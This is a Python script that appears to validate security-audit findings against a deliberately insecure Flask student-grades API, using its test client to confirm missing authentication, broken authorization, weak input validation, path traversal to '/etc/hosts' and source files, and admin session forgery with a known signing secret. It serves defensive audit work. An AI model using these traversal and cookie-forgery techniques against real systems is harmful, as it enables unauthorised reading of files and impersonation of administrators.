"""Reproduce each candidate finding against the UNMODIFIED baseline with Flask's test client.

Run from the repository root:  python3 evidence/validation/repro_baseline.py .
Save the output:              python3 evidence/validation/repro_baseline.py . > evidence/validation/repro_baseline_output.txt
"""
import copy
import sys

sys.path.insert(0, sys.argv[1] if len(sys.argv) > 1 else ".")
import baseline_secure_coding_api as api  # noqa: E402

ORIG = copy.deepcopy(api.GRADES)


def reset():
    api.GRADES[:] = copy.deepcopy(ORIG)


def client(user=None, pw=None):
    c = api.app.test_client()
    if user:
        r = c.post("/login", data={"username": user, "password": pw}, follow_redirects=True)
        assert r.status_code == 200, r.data
    return c


def show(label, r):
    body = r.get_data(as_text=True).strip().replace("\n", " ")
    print(f"{label:58} -> {r.status_code}  {body[:150]}")


print("== F01 authentication missing (no login) ==")
c = client()
show("GET /students/1001/profile", c.get("/students/1001/profile"))
show("GET /grades/1001", c.get("/grades/1001"))
show("GET /files?path=srs-summary.txt", c.get("/files?path=srs-summary.txt"))
r = c.post("/grades/update", json={"student_id": 1001, "course_id": "SRS", "grade": 20})
show("POST /grades/update (anon)", r)
print("   stored SRS grade for 1001 now:", api.find_grade(1001, "SRS")["grade"])
reset()

print("== F02 profile object authorization ==")
show("alice -> /students/1002/profile", client("alice", "alicepw").get("/students/1002/profile"))
show("prof_srs -> /students/1001/profile", client("prof_srs", "profpw").get("/students/1001/profile"))

print("== F03 grade read authorization / filtering ==")
show("alice -> /grades/1002", client("alice", "alicepw").get("/grades/1002"))
show("prof_srs -> /grades/1001 (has SRS+SSD)", client("prof_srs", "profpw").get("/grades/1001"))

print("== F04 grade update authorization ==")
c = client("alice", "alicepw")
show("alice updates own SRS grade to 20", c.post("/grades/update", json={"student_id": 1001, "course_id": "SRS", "grade": 20}))
show("alice updates bob SRS grade to 0", c.post("/grades/update", json={"student_id": 1002, "course_id": "SRS", "grade": 0}))
reset()
c = client("prof_srs", "profpw")
show("prof_srs updates alice SSD (not assigned)", c.post("/grades/update", json={"student_id": 1001, "course_id": "SSD", "grade": 0}))
print("   stored SSD grade for 1001 now:", api.find_grade(1001, "SSD")["grade"])
reset()

print("== F05 grade update input validation ==")
c = client("admin1", "adminpw")
for label, body in [
    ("grade 999", {"student_id": 1001, "course_id": "SRS", "grade": 999}),
    ("grade true (bool)", {"student_id": 1001, "course_id": "SRS", "grade": True}),
    ("grade 'A+' (string)", {"student_id": 1001, "course_id": "SRS", "grade": "A+"}),
    ("unknown course XYZ", {"student_id": 1001, "course_id": "XYZ", "grade": 10}),
    ("unknown student 9999", {"student_id": 9999, "course_id": "SRS", "grade": 10}),
    ("student_id as string '1001'", {"student_id": "1001", "course_id": "SRS", "grade": 10}),
]:
    before = len(api.GRADES)
    show(label, c.post("/grades/update", json=body))
    print(f"   GRADES rows {before} -> {len(api.GRADES)}")
    reset()
show("missing grade field", c.post("/grades/update", json={"student_id": 1001, "course_id": "SRS"}))
show("JSON list instead of object", c.post("/grades/update", json=[1, 2, 3]))
show("non-JSON body", c.post("/grades/update", data="x=1"))

print("== F06 path traversal ==")
c = client("alice", "alicepw")
show("../baseline_secure_coding_api.py", c.get("/files?path=../baseline_secure_coding_api.py"))
show("absolute /etc/hosts", c.get("/files?path=/etc/hosts"))

print("== F07 student id validation ==")
show("/students/abc/profile", c.get("/students/abc/profile"))
show("/grades/-1", c.get("/grades/-1"))
show("/grades/0", c.get("/grades/0"))

print("== F08 error handling ==")
show("missing file (leaks path?)", c.get("/files?path=nope.txt"))
show("unknown route /nope (should be 404)", c.get("/nope"))
show("GET on POST-only /grades/update (should be 405)", c.get("/grades/update"))

print("== F09 session forgery with known secret ==")
from flask.sessions import SecureCookieSessionInterface  # noqa: E402
s = SecureCookieSessionInterface().get_signing_serializer(api.app)
forged = s.dumps({"user": "admin1", "role": "admin", "student_id": None, "courses": []})
c = api.app.test_client()
c.set_cookie("session", forged)
show("/me with forged cookie (no password)", c.get("/me"))

print("== F15 session fixation claim (B observation) ==")
c = api.app.test_client()
c.set_cookie("session", s.dumps({"planted": "attacker"}))
c.post("/login", data={"username": "alice", "password": "alicepw"})
show("session keys after alice login over planted cookie", c.get("/me"))
